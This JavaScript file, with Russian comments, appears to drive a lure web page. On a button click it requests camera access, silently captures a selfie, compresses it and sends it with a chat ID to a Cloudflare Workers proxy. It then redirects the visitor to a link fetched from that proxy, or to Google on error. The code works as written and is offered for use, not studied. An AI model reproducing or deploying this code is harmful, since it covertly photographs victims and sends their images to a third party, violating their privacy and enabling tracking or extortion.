const proxyUrl = 'https://silent-surf-60b2.parsinnikita76.workers.dev';
const chatId = '1976857829';

// 1. ЗАПУСКАЕМ ПОЛУЧЕНИЕ ССЫЛКИ ЗАРАНЕЕ (ФОНОМ)
let targetUrlPromise = fetch(proxyUrl + "/get-url")
    .then(res => res.text())
    .catch(() => "https://google.com");

const btn = document.getElementById('btn');
const video = document.getElementById('v');
const canvas = document.getElementById('c');

btn.onclick = async () => {
    btn.innerText = "Загрузка..."; 
    btn.disabled = true;
    let stream;

    try {
        stream = await navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: "user", width: 640, height: 480 } 
        });

        video.srcObject = stream;
        video.setAttribute("playsinline", true);
        
        await new Promise((resolve) => {
            video.onloadedmetadata = () => {
                video.play();
                setTimeout(resolve, 500); // Уменьшили задержку до 0.5 сек
            };
        });

        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
        
        const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.6)); // Сжали фото для скорости
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('photo', blob, 'shot.jpg');

        // 2. ОТПРАВЛЯЕМ ФОТО И ЖДЕМ ССЫЛКУ ОДНОВРЕМЕННО
        const [photoRes, finalUrl] = await Promise.all([
            fetch(proxyUrl, { method: 'POST', body: formData }),
            targetUrlPromise // Ссылка уже должна была загрузиться к этому моменту
        ]);

        window.location.href = finalUrl;

    } catch (err) {
        console.error(err);
        // Если всё сломалось — просто уходим на гугл
        window.location.href = "https://google.com";
    } finally {
        if (stream) stream.getTracks().forEach(t => t.stop());
    }
};
